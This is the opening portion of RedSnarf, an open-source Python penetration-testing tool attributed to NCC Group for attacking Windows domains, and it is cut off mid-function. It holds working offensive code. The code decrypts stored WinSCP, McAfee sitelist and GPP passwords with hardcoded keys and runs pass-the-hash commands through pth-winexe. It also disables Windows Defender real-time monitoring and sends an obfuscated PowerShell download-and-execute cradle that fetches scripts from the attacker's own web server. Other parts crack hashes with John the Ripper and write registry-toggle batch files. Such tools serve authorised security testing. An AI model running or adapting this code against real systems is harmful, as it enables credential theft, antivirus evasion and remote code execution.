#! /usr/bin/python
# Released as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
# https://github.com/nccgroup/redsnarf
# Released under Apache V2 see LICENCE for more information

from __future__ import print_function
import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
import socket, fcntl, struct, time, base64, logging, urllib

import time
import xml.etree.ElementTree as ET

try:
	from nmb.NetBIOS import NetBIOS
except ImportError:
	print("You need to install pysmb")
	print("pip install pysmb")
	logging.error("pysmb missing")
	exit(1)

try:
	from docopt import docopt
except ImportError:
	print("You need to install docopt")
	print("pip install docopt")
	logging.error("docopt missing")
	exit(1)

try:
	from pykeyboard import PyKeyboard
except ImportError:
	print("You need to install pyuserinput")
	print("pip install pyuserinput")
	logging.error("pyuserinput missing")
	exit(1)

try:
	from pymouse import PyMouseEvent
except ImportError:
	print("You need to install pyuserinput")
	print("pip install pyuserinput")
	logging.error("pyuserinput missing")
	exit(1)

try:
	import wget
except ImportError:
	print("You need to install wget")
	print("pip install wget")
	logging.error("wget missing")
	exit(1)

try:
	from libnmap.process import NmapProcess
except ImportError:
	print("You need to install python-libnmap")
	print(" git clone https://github.com/savon-noir/python-libnmap.git")
	print(" cd python-libnmap")
	print(" python setup.py install")
	logging.error("NmapProcess missing")
	exit(1)

try:
	from libnmap.parser import NmapParser
except ImportError:
	print("You need to install python-libnmap")
	print(" git clone https://github.com/savon-noir/python-libnmap.git")
	print(" cd python-libnmap")
	print(" python setup.py install")
	logging.error("NmapProcess missing")
	exit(1)

from random import shuffle

# Logging definitions
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', filename='redsnarf.log', filemode='a')
logging.debug("Command parameters run: %s", sys.argv[1:])

try:
	import ldap
except ImportError:
	print("Try installing these modules to help with this error")
	print("run 'pip install python-ldap' to install ldap module.")
	print("apt-get install libpq-dev python-dev libxml2-dev libxslt1-dev libldap2-dev libsasl2-dev libffi-dev")
	print("apt-get install python2.7-dev")
	logging.error("ldap dependencies missing")
	exit(1)

try:
	from IPy import IP
except ImportError:
	print("You need to install IPy module: apt-get install python-ipy")
	logging.error("IPy missing")
	exit(1)

try:
	from netaddr import IPNetwork
except ImportError:
	print('Netaddr appears to be missing - try: pip install netaddr')
	logging.error("Netaddr missing")
	exit(1)

try:
	from termcolor import colored
except ImportError:
	print('termcolor appears to be missing - try: pip install termcolor')
	logging.error("termcolor missing")
	exit(1)

from Crypto.Cipher import DES3
from Crypto.Hash import SHA
from Crypto.Cipher import AES
from base64 import b64decode
from socket import *
from threading import Thread
from impacket.smbconnection import *
from random import randint
from base64 import b64encode
from base64 import b64decode

#####
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.dcerpc.v5 import transport, samr
from impacket import ntlm
from time import strftime, gmtime

try:
	raw_input          # Python 2
except NameError:
	raw_input = input  # Python 3

yesanswers = ["yes", "y", "Y", "Yes", "YES", "pwn", "PWN"]
noanswers = ["no", "NO", "n", "N"]
events_logs = ["application","security","setup","system"]

def banner():
	print("""
    ______           .____________                     _____
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|
        \/     \/     \/       \/     \/     \/
                                  redsnarf.ff0000@gmail.com
                                                  @redsnarf
""")
	print(colored("\nE D Williams - NCCGroup",'red'))


class AbortMouse(PyMouseEvent):
	def click(self, x, y, button, press):
		if press:
			self.stop()

# hardcoded XOR key
KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")

def sitelist_xor(xs):
    return ''.join(chr(ord(c) ^ ord(KEY[i%16]))for i, c in enumerate(xs))

def des3_ecb_decrypt(data):
    # hardcoded 3DES key
    key = SHA.new(b'<!@#$%^>').digest() + "\x00\x00\x00\x00"
    # decrypt
    des3 = DES3.new(key, DES3.MODE_ECB, "")
    decrypted = des3.decrypt(data)
    # quick hack to ignore padding
    return decrypted[0:decrypted.find('\x00')] or "<empty>"

def dns_server_name(username,password,host,domain_name):
	user=args.username.strip()
	passw=args.password.strip()

	passwd=''

	if passw[len(passw)-3:] ==':::':
		lmhash, nthash ,s1,s2,s3 = passw.split(':')
		passwd=lmhash+":"+nthash
	else:
		lmhash = ''
		nthash = ''

	if nthash=='':
		passwd=passw

	try:

		smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10)

		x=smbClient.login(user, passwd, domain_name, lmhash, nthash)

		if x==None or x==True:

			return smbClient.getServerDNSDomainName()

	except:
		return "error"


#Finds if JTR Jumbo is installed and returns path
def jtr_jumbo_installed():
	#Use README-jumbo as an indicator that Jtr Jumbo is installed
	proc = subprocess.Popen("locate *README-jumbo", stdout=subprocess.PIPE,shell=True)
	stdout_value = proc.communicate()[0]

	if len(stdout_value)!=0:
		jumbojohnpath=stdout_value[:-13]+"run/john"
		if os.path.isfile(jumbojohnpath):
			return jumbojohnpath

#WinSCP Decryption Routines
#Source: https://www.jonaslieb.com/blog/2015/02/20/winscp-session-password-decryption-part-2/
class Decrypter:
	SIMPLE_STRING = "0123456789ABCDEF"
	SIMPLE_MAGIC = 0xA3

	def __init__(self, password):
		self.data = password

	def next(self):
		a = self.SIMPLE_STRING.index(self.data[0])
		b = self.SIMPLE_STRING.index(self.data[1])
		result = ~(((a << 4) + b) ^ self.SIMPLE_MAGIC) % 256
		self.discard(2)
		return result

	def discard(self, n=2):
		self.data = self.data[n:]

def decrypt(hostname, username, password):
	FLAG_SIMPLE = 0xFF

	decrypter = Decrypter(password)

	flag = decrypter.next()
	if flag == FLAG_SIMPLE:
		decrypter.discard(2)
		length = decrypter.next()
	else:
		length = flag

	offset = decrypter.next()
	decrypter.discard(offset*2)

	result = "".join([chr(decrypter.next()) for i in range(length)])

	key = username + hostname
	if flag == FLAG_SIMPLE and result.startswith(key):
		return result[len(key):]

	return result


#Code for Password Policy Retrievel
#source: https://github.com/Wh1t3Fox/polenum

def d2b(a):
	tbin = []
	while a:
		tbin.append(a % 2)
		a /= 2

	t2bin = tbin[::-1]
	if len(t2bin) != 8:
		for x in xrange(6 - len(t2bin)):
			t2bin.insert(0, 0)
	return ''.join([str(g) for g in t2bin])

def convert(low, high, lockout=False):
    time = ""
    tmp = 0

    if low == 0 and hex(high) == "-0x80000000":
        return "Not Set"
    if low == 0 and high == 0:
        return "None"

    if not lockout:
        if (low != 0):
            high = abs(high+1)
        else:
            high = abs(high)
            low = abs(low)

            tmp = low + (high)*16**8  # convert to 64bit int
            tmp *= (1e-7)  # convert to seconds
    else:
        tmp = abs(high) * (1e-7)

    try:
        minutes = int(strftime("%M", gmtime(tmp)))
        hours = int(strftime("%H", gmtime(tmp)))
        days = int(strftime("%j", gmtime(tmp)))-1
    except ValueError as e:
        return "[-] Invalid TIME"

    if days > 1:
        time += "{0} days ".format(days)
    elif days == 1:
    	time += "{0} day ".format(days)
    if hours > 1:
    	time += "{0} hours ".format(hours)
    elif hours == 1:
    	time += "{0} hour ".format(hours)
    if minutes > 1:
    	time += "{0} minutes ".format(minutes)
    elif minutes == 1:
    	time += "{0} minute ".format(minutes)
    return time

class SAMRDump:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\samr]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\samr]', 445),
    }

    def __init__(self, protocols=None,
                 username='', password=''):
        if not protocols:
            protocols = SAMRDump.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = protocols

    def dump(self, addr):
        """Dumps the list of users and shares registered present at
        addr. Addr is a valid host name or IP address.
        """
        encoding = sys.getdefaultencoding()
        print('\n')
        if (self.__username and self.__password):
            print('[+] Attaching to {0} using {1}:{2}'.format(addr, self.__username, self.__password))
        elif (self.__username):
            print('[+] Attaching to {0} using {1}'.format(addr, self.__username))
        else:
            print('[+] Attaching to {0} using a NULL share'.format(addr))

        # Try all requested protocols until one works.
        for protocol in self.__protocols:
            try:
                protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
                port = protodef[1]
            except KeyError:
                print("\n\t[!] Invalid Protocol '{0}'\n".format(protocol))
                sys.exit(1)
            print("\n[+] Trying protocol {0}...".format(protocol))
            rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password)

            try:
                self.__fetchList(rpctransport)
            except Exception as e:
                print('\n\t[!] Protocol failed: {0}'.format(e))
            else:
                # Got a response. No need for further iterations.
                self.__pretty_print()
                break

    def __fetchList(self, rpctransport):
		dce = DCERPC_v5(rpctransport)
		dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_INTEGRITY)
		dce.bind(samr.MSRPC_UUID_SAMR)

        # Setup Connection
		resp = samr.hSamrConnect2(dce)

		if resp['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle=resp['ServerHandle'],enumerationContext=0,preferedMaximumLength=500)
		if resp2['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp3 = samr.hSamrLookupDomainInSamServer(dce, serverHandle=resp['ServerHandle'],
                                                  name=resp2['Buffer']['Buffer'][0]['Name'])
		if resp3['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp4 = samr.hSamrOpenDomain(dce, serverHandle=resp['ServerHandle'],
                                     desiredAccess=samr.MAXIMUM_ALLOWED,
                                     domainId=resp3['DomainId'])
		if resp4['ErrorCode'] != 0:
			raise Exception('Connect error')

		self.__domains = resp2['Buffer']['Buffer']
		domainHandle = resp4['DomainHandle']
        # End Setup

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
		self.__min_pass_len = re['Buffer']['Password']['MinPasswordLength'] or "None"
		self.__pass_hist_len = re['Buffer']['Password']['PasswordHistoryLength'] or "None"
		self.__max_pass_age = convert(int(re['Buffer']['Password']['MaxPasswordAge']['LowPart']), int(re['Buffer']['Password']['MaxPasswordAge']['HighPart']))
		self.__min_pass_age = convert(int(re['Buffer']['Password']['MinPasswordAge']['LowPart']), int(re['Buffer']['Password']['MinPasswordAge']['HighPart']))
		self.__pass_prop = d2b(re['Buffer']['Password']['PasswordProperties'])

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
		self.__rst_accnt_lock_counter = convert(0, re['Buffer']['Lockout']['LockoutObservationWindow'], lockout=True)
		self.__lock_accnt_dur = convert(0, re['Buffer']['Lockout']['LockoutDuration'], lockout=True)
		self.__accnt_lock_thres = re['Buffer']['Lockout']['LockoutThreshold'] or "None"

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLogoffInformation)
		self.__force_logoff_time = convert(re['Buffer']['Logoff']['ForceLogoff']['LowPart'], re['Buffer']['Logoff']['ForceLogoff']['HighPart'])


    def __pretty_print(self):

        PASSCOMPLEX = {
            5: 'Domain Password Complex:',
            4: 'Domain Password No Anon Change:',
            3: 'Domain Password No Clear Change:',
            2: 'Domain Password Lockout Admins:',
            1: 'Domain Password Store Cleartext:',
            0: 'Domain Refuse Password Change:'
        }

        print('\n[+] Found domain(s):\n')
        for domain in self.__domains:
            print('\t[+] {0}'.format(domain['Name']))

        print("\n[+] Password Info for Domain: {0}".format(self.__domains[0]['Name']))

        print("\n\t[+] Minimum password length: {0}".format(self.__min_pass_len))
        print("\t[+] Password history length: {0}".format(self.__pass_hist_len))
        print("\t[+] Maximum password age: {0}".format(self.__max_pass_age))
        print("\t[+] Password Complexity Flags: {0}\n".format(self.__pass_prop or "None"))

        for i, a in enumerate(self.__pass_prop):
            print("\t\t[+] {0} {1}".format(PASSCOMPLEX[i], str(a)))

        print("\n\t[+] Minimum password age: {0}".format(self.__min_pass_age))
        print("\t[+] Reset Account Lockout Counter: {0}".format(self.__rst_accnt_lock_counter))
        print("\t[+] Locked Account Duration: {0}".format(self.__lock_accnt_dur))
        print("\t[+] Account Lockout Threshold: {0}".format(self.__accnt_lock_thres))
        print("\t[+] Forced Log off Time: {0}".format(self.__force_logoff_time))

def cps(script,flag,invfunc,funccmd,chost,system):
	try:

		print(colored("[+]Checking for "+script,'green'))
		if not os.path.isfile('./'+script):
			print(colored("[-]Cannot find "+script,'red'))
			exit(1)
		print(colored("[+]Looks good",'green'))

		#Check to make sure port is not already in use
		for i in xrange(10):
			PORT = randint(49151,65535)
			proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			if len(stdout_value)>0:
				break

		my_ip=get_ip_address('eth0')
		print(colored("[+]Attempting to Run "+script,'green'))
		Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
		httpd = SocketServer.TCPServer(("",PORT), Handler)
		print(colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green'))
		server_process = multiprocessing.Process(target=httpd.serve_forever)
		server_process.daemon = True
		server_process.start()

		x=' '

		if flag=="AV":
			#Get Windows Defender status and store status
			print(colored("[+]Getting Windows Defender Status",'yellow'))
			line="Get-MpPreference | fl DisableRealtimeMonitoring"
			en = b64encode(line.encode('UTF-16LE'))

			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			if "DisableRealtimeMonitoring : False" in stdout_value:
				print(colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow'))
				AVstatus='On'
			else:
				print(colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow'))
				AVstatus='Off'

		#Debug
		#-ConType bind -Port 5900 -Password P@ssw0rd
		if invfunc =="Invoke-Vnc" and funccmd =="vnc":
			funccmd="-ConType bind -Port 5900 -Password P@ssw0rd"

		if flag=="AV":
			#If Windows Defender is turned on turn off
			if AVstatus=='On':
				response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
				if response in yesanswers:
					print(colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue'))
					line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
					en = b64encode(line.encode('UTF-16LE'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")

			#Prepare string
			line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/"+script+"'));"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd
		else:
			line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/"+script+"'));"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd

		print(colored("[+] Using: "+line,'yellow'))
		en = b64encode(line.encode('UTF-16LE'))
		print(colored("[+] Encoding command: "+en,'yellow'))

		if system=="system":
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
		else:
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")

		if flag=="AV":
			#If Windows Defender AV status was on, turn it back on
			if AVstatus=='On':
				if response in yesanswers:
					print(colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue'))
					line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
					en = b64encode(line.encode('UTF-16LE'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")

	except IOError as e:
		print("I/O error({0}): {1}".format(e.errno, e.strerror))


#Routine decrypts cpassword values
def gppdecrypt(cpassword_pass):
	#Original code taken from the resource below.
	#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
	key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
	cpassword = cpassword_pass
	cpassword += "=" * ((4 - len(sys.argv[1]) % 4) % 4)
	password = b64decode(cpassword)
	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
	print(colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green'))

def bashversion():

	installedversion = bashcompleteversioncheck("/etc/bash_completion.d/redsnarf.rc")
	bundleversion = bashcompleteversioncheck("redsnarf.rc")

	if installedversion=="NoExist" or installedversion=="Unknown":
		return "Bash Tab Completion Not Configured"
	elif installedversion<bundleversion:
		return "You need to update your Bash Tab Completion file, Version "+bundleversion+" is available."
	elif installedversion==bundleversion:
		return "Bash Tab Completion Installed & Up-to-date"

def bashcompleteversioncheck(FilePath):
	#/etc/bash_completion.d/redsnarf.rc
	if not os.path.isfile(FilePath):
		return "NoExist"
	elif os.path.isfile(FilePath):
		bashlines = []

		with open(FilePath,'r') as inifile:
			data=inifile.read()
			bashlines=data.splitlines()

		#Make sure that the list of bashlines is greater than 0
		if len(bashlines)>0:
			if 'Version' in bashlines[0]:
				versionnum=bashlines[0].split(",", 1)[1]
		else:
			versionnum="Unknown"

		return versionnum


#Routine helps start John the Ripper Jumbo
def quickjtrjumbo(filename, jtrjumbopath):
	#Set our variables/etc up
	LogicRule = []
	LogicRule.append("AppendNumbers_and_Specials_Simple")
	LogicRule.append("L33t")
	LogicRule.append("AppendYears")
	LogicRule.append("AppendSeason")
	LogicRule.append("PrependAppend1-4")
	LogicRule.append("ReplaceNumbers")
	LogicRule.append("AddJustNumbersLimit8")
	LogicRule.append("ReplaceLetters")
	LogicRule.append("ReplaceLettersCaps")

	WordList=""
	KoreRuleToUse=""

	#Setup if we're going to use a wordlist or not
	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):
		print(colored("[+]Detected /usr/share/wordlists/rockyou.txt",'green'))
		UseRockYou = raw_input("Would you like to use rockyou.txt as your wordlist?: Y/(N) ")
		if UseRockYou in yesanswers:
			print(colored("[+]Selected as wordlist - /usr/share/wordlists/rockyou.txt",'green'))
			WordList = "/usr/share/wordlists/rockyou.txt"
		elif UseRockYou in noanswers:
			Alternative = raw_input("Would you like to use an alternative wordlist?: Y/(N) ")
			if Alternative in yesanswers:
				WordList = raw_input("Enter path to wordlist: ")
				if os.path.isfile(WordList):
					print(colored("[+]Selected as wordlist - "+WordList,'green'))
				else:
					print(colored("[-]Selected wordlist - "+WordList+" doesn't exist...",'red'))
					sys.exit()
			else:
				WordList = ""
		else:
			WordList=""

	#If we're using a wordlist check to see if KoreLogicRules are installed and
	#see if we want to use them
	if WordList!="":
		print(colored("[+]KoreLogic Rules are installed",'green'))
		UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")

		#If KoreLogic is installed and we want to use it
		if UseKoreLogic in yesanswers:
			print(colored("[+]Some common rules are:",'green'))
			print(colored("[0]AppendNumbers_and_Specials_Simple",'blue'))
			print(colored("[1]L33t",'blue'))
			print(colored("[2]AppendYears",'blue'))
			print(colored("[3]AppendSeason",'blue'))
			print(colored("[4]PrependAppend1-4",'blue'))
			print(colored("[5]ReplaceNumbers",'blue'))
			print(colored("[6]AddJustNumbersLimit8",'blue'))
			print(colored("[7]ReplaceLetters",'blue'))
			print(colored("[8]ReplaceLettersCaps",'blue'))
			print(colored("[9]Other",'blue'))

			KoreLogicRule = raw_input("Please enter the number of the rule you wish to use: ")

			if KoreLogicRule=="9":
				KoreRuleToUse=raw_input("Please enter the rule you wish to use: ")
				if KoreRuleToUse=="":
					print(colored("[-]No rule entered...",'red'))
					#exit(1)
				else:
					print(colored("[+]Selected KoreLogicRule - "+ KoreRuleToUse,'green'))
			else:
				print(colored("[+]Selected KoreLogicRule - "+ str(LogicRule[int(KoreLogicRule)]),'green'))
				KoreRuleToUse = str(LogicRule[int(KoreLogicRule)])

	#If no wordlist and no korelogic is selected
	if WordList=="" and KoreRuleToUse=="":
		print(colored("[+]Starting John The Ripper with No Wordlist or KoreLogicRules",'yellow'))
		print(colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename),'yellow'))
		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename))
	#If a wordlist is selected and we're not using korelogic
	elif WordList!="" and KoreRuleToUse=="":
		print(colored("[+]Starting John The Ripper with Wordlist and No KoreLogicRules",'yellow'))
		print(colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist="+WordList+" --rules",'yellow'))
		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist=" +WordList+" --rules")
	#If we're using a wordlist and we're using korelogic
	elif WordList!="" and KoreRuleToUse!="":
		print(colored("[+]Starting John The Ripper with Wordlist and KoreLogicRules",'yellow'))
		print(colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist="+WordList+" --rules:"+KoreRuleToUse,'yellow'))
		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist=" +WordList+" --rules:"+KoreRuleToUse)

#Routine helps start John the Ripper
def quickjtr(filename):
	#Set our variables/etc up
	LogicRule = []
	LogicRule.append("KoreLogicRulesAppendNumbers_and_Specials_Simple")
	LogicRule.append("KoreLogicRulesL33t")
	LogicRule.append("KoreLogicRulesAppendYears")
	LogicRule.append("KoreLogicRulesAppendSeason")
	LogicRule.append("KoreLogicRulesPrependAppend1-4")
	LogicRule.append("KoreLogicRulesReplaceNumbers")
	LogicRule.append("KoreLogicRulesAddJustNumbersLimit8")
	LogicRule.append("KoreLogicRulesReplaceLetters")
	LogicRule.append("KoreLogicRulesReplaceLettersCaps")

	WordList=""
	KoreRuleToUse=""

	#Setup if we're going to use a wordlist or not
	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):
		print(colored("[+]Detected /usr/share/wordlists/rockyou.txt",'green'))
		UseRockYou = raw_input("Would you like to use rockyou.txt as your wordlist?: Y/(N) ")
		if UseRockYou in yesanswers:
			print(colored("[+]Selected as wordlist - /usr/share/wordlists/rockyou.txt",'green'))
			WordList = "/usr/share/wordlists/rockyou.txt"
		elif UseRockYou in noanswers:
			Alternative = raw_input("Would you like to use an alternative wordlist?: Y/(N) ")
			if Alternative in yesanswers:
				WordList = raw_input("Enter path to wordlist: ")
				if os.path.isfile(WordList):
					print(colored("[+]Selected as wordlist - "+WordList,'green'))
				else:
					print(colored("[-]Selected wordlist - "+WordList+" doesn't exist...",'red'))
					sys.exit()
			else:
				WordList = ""
		else:
			WordList=""

	#If we're using a wordlist check to see if KoreLogicRules are installed and
	#see if we want to use them
	if WordList!="" and 'KoreLogicRules' in open("/etc/john/john.conf").read():
		print(colored("[+]Detected that KoreLogicRules in installed in john.conf",'green'))
		UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")

		#If KoreLogic is installed and we want to use it
		if UseKoreLogic in yesanswers:
			print(colored("[+]Some common rules are:",'green'))
			print(colored("[0]KoreLogicRulesAppendNumbers_and_Specials_Simple",'blue'))
			print(colored("[1]KoreLogicRulesL33t",'blue'))
			print(colored("[2]KoreLogicRulesAppendYears",'blue'))
			print(colored("[3]KoreLogicRulesAppendSeason",'blue'))
			print(colored("[4]KoreLogicRulesPrependAppend1-4",'blue'))
			print(colored("[5]KoreLogicRulesReplaceNumbers",'blue'))
			print(colored("[6]KoreLogicRulesAddJustNumbersLimit8",'blue'))
			print(colored("[7]KoreLogicRulesReplaceLetters",'blue'))
			print(colored("[8]KoreLogicRulesReplaceLettersCaps",'blue'))
			print(colored("[9]Other",'blue'))

			KoreLogicRule = raw_input("Please enter the number of the rule you wish to use: ")

			if KoreLogicRule=="9":
				KoreRuleToUse=raw_input("Please enter the rule you wish to use: ")
				if KoreRuleToUse=="":
					print(colored("[-]No rule entered...",'red'))
					#exit(1)
				else:
					print(colored("[+]Selected KoreLogicRule - "+ KoreRuleToUse,'green'))
			else:
				print(colored("[+]Selected KoreLogicRule - "+ str(LogicRule[int(KoreLogicRule)]),'green'))
				KoreRuleToUse = str(LogicRule[int(KoreLogicRule)])

	#If no wordlist and no korelogic is selected
	if WordList=="" and KoreRuleToUse=="":
		print(colored("[+]Starting John The Ripper with No Wordlist or KoreLogicRules",'yellow'))
		print(colored("[+]john --format=nt "+str(filename)+ " --rules",'yellow'))
		os.system("john --format=nt "+str(filename)+" --rules")
	#If a wordlist is selected and we're not using korelogic
	elif WordList!="" and KoreRuleToUse=="":
		print(colored("[+]Starting John The Ripper with Wordlist and No KoreLogicRules",'yellow'))
		print(colored("[+]john --format=nt "+str(filename)+ " --wordlist="+WordList+" --rules",'yellow'))
		os.system("john --format=nt "+str(filename)+ " --wordlist=" +WordList+" --rules")
	#If we're using a wordlist and we're using korelogic
	elif WordList!="" and KoreRuleToUse!="":
		print(colored("[+]Starting John The Ripper with Wordlist and KoreLogicRules",'yellow'))
		print(colored("[+]john --format=nt "+str(filename)+ " --wordlist="+WordList+" --rules:"+KoreRuleToUse,'yellow'))
		os.system("john --format=nt "+str(filename)+ " --wordlist=" +WordList+" --rules:"+KoreRuleToUse)


#Routine Write out a batch file which can be used to turn on/off LocalAccountTokenFilterPolicy
def WriteLAT():
	try:
		print(colored("[+]Attempting to write Local Account Token Filter Policy ",'green'))
		logging.info("[+]Attempting to write Local Account Token Filter Policy ")
		fout=open('/tmp/lat.bat','w')
		fout.write('@echo off\n\n')
		fout.write('cls\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo LocalAccountTokenFilterPolicy Enable/Disable Script\n')
		fout.write('echo NCCGroup	\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo [+] Searching Registry......\n')
		fout.write('echo .\n')
		fout.write('reg.exe query "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v "LocalAccountTokenFilterPolicy" | Find "0x1"\n')
		fout.write('IF %ERRORLEVEL% == 1 goto turnon\n')
		fout.write('If %ERRORLEVEL% == 0 goto remove\n\n')
		fout.write('goto end\n')
		fout.write(':remove\n\n')
		fout.write('reg.exe delete "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /f \n')
		fout.write('echo .\n')
		fout.write('echo [+] Registry Key Removed \n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy\n')
		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':turnon\n\n')
		fout.write('reg.exe add "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /D 1 \n')
		fout.write('echo .\n')
		fout.write('echo [+] Added Registry Key\n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy with value of 1\n')
		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':end\n')
		fout.close()
		print(colored("[+]Written to /tmp/lat.bat ",'yellow'))
		logging.info("[+]Written to /tmp/lat.bat ")
	except:
		print(colored("[-]Something went wrong...",'red'))
		logging.error("[-]Something went wrong writing LAT file")

#Routine Write out a batch file which can be used to turn on/off LocalAccountTokenFilterPolicy
def WriteFAT():
	try:
		print(colored("[+]Attempting to write Filter Administrator Token Policy Helper",'green'))
		logging.info("[+]Attempting to write Filter Administrator Token Policy Helper")
		fout=open('/tmp/fat.bat','w')
		fout.write('@echo off\n\n')
		fout.write('cls\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo FilterAdministratorToken Enable/Disable Script\n')
		fout.write('echo R Davy - NCCGroup	\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo [+] Searching Registry......\n')
		fout.write('echo .\n')
		fout.write('reg.exe query "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v "FilterAdministratorToken" | Find "0x1"\n')
		fout.write('IF %ERRORLEVEL% == 1 goto turnon\n')
		fout.write('If %ERRORLEVEL% == 0 goto remove\n\n')
		fout.write('goto end\n')
		fout.write(':remove\n\n')
		fout.write('reg.exe delete "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v FilterAdministratorToken /f \n')
		fout.write('echo .\n')
		fout.write('echo [+] Registry Key Removed \n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\FilterAdministratorToken\n')
		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':turnon\n\n')
		fout.write('reg.exe add "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v FilterAdministratorToken /t REG_DWORD /f /D 1 \n')
		fout.write('echo .\n')
		fout.write('echo [+] Added Registry Key\n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\FilterAdministratorToken with value of 1\n')
